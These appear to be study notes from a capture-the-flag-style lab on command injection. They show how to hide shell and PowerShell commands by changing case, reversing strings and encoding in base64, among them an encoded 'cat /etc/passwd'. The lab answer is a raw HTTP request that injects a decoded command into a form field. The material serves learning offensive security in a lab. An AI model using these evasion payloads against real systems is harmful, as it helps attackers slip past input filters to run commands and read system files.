# Advanced Command Obfuscation
## Case Manipulation
Windows is not case-sensitive so this will work:

```pwsh
PS C:\htb> WhOaMi

21y4d
```

For Linux, we can use:

```sh
$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

## Reversed Commands

```sh
$ $(rev<<<'imaohw')

21y4d
```

```pwsh
PS C:\htb> "whoami"[-1..-20] -join ''
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
```

## Encoded Commands

```sh
$ echo -n 'cat /etc/passwd | grep 33' | base64
$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

```pwsh
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
dwBoAG8AYQBtAGkA
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
21y4d
```

## Questions
1. Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1 **Answer:**
   - Base64 encode the command:
        ```sh
        $ echo 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
        ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEK
        ```
   - Inject the command:
        ```
        POST / HTTP/1.1
        Host: 154.57.164.81:32341
        Content-Length: 112
        Cache-Control: max-age=0
        Accept-Language: en-US,en;q=0.9
        Origin: http://154.57.164.81:32341
        Content-Type: application/x-www-form-urlencoded
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://154.57.164.81:32341/
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

        ip=0.0.0.0%0abash<<<$(base64${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEK)
        ```